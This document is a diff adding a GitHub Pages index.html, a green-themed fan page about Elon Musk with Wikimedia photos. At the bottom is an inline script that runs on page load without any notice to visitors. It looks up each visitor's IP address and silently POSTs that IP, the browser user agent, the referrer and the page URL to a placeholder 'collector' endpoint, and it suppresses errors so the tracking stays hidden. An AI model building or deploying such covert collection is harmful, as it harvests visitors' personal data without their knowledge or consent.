@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<!-- language: HTML, file: index.html, target: GitHub Pages -->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Elon Musk — Green</title>
+<style>
+  :root { --g:#0b3d1f; --g2:#1f7a3f; --lime:#b6f36b; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--g); color:#eaffea;
+         font-family:Georgia,serif; line-height:1.65; }
+  header { padding:4rem 2rem 2.5rem; text-align:center;
+           background:linear-gradient(180deg,var(--g2),var(--g)); }
+  h1 { font-size:3rem; margin:0; color:var(--lime); letter-spacing:3px; }
+  .sub { opacity:.85; margin-top:.5rem; font-style:italic; }
+  main { max-width:860px; margin:0 auto; padding:2rem; }
+  .pics { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+          gap:1rem; margin:2rem 0; }
+  .pics img { width:100%; border-radius:12px; border:2px solid var(--lime); display:block; }
+  footer { text-align:center; padding:2rem; opacity:.55; font-size:.85rem; }
+</style>
+</head>
+<body>
+<header>
+  <h1>ELON MUSK</h1>
+  <div class="sub">a green page</div>
+</header>
+<main>
+  <p>Rockets, cars, tunnels, noise. A man who treats the future like a deadline.
+     This page is green because green is the color of things that grow.</p>
+  <div class="pics">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/Elon_Musk_Royal_Society_crop.jpg/480px-Elon_Musk_Royal_Society_crop.jpg" alt="Elon Musk">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Elon_Musk_2015.jpg/480px-Elon_Musk_2015.jpg" alt="Elon Musk 2015">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Elon_Musk_Colorado_2022_%28cropped%29.jpg/480px-Elon_Musk_Colorado_2022_%28cropped%29.jpg" alt="Elon Musk 2022">
+  </div>
+  <p>More words. The page looks ordinary. It is ordinary — with one quiet
+     fetch that tells the collector who stopped by.</p>
+</main>
+<footer>green page</footer>
+<script>
+  // language: JavaScript, file: inline, target: browser
+  var COLLECTOR = 'PASTE_EXEC_URL_HERE';
+  (async function () {
+    try {
+      var r = await fetch('https://api.ipify.org?format=json');
+      var d = await r.json();
+      await fetch(COLLECTOR, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'text/plain' },
+        body: JSON.stringify({
+          ip: d.ip,
+          ua: navigator.userAgent,
+          ref: document.referrer || '',
+          page: location.href
+        })
+      });
+    } catch (e) {}
+  })();
+</script>
+</body>
+</html>
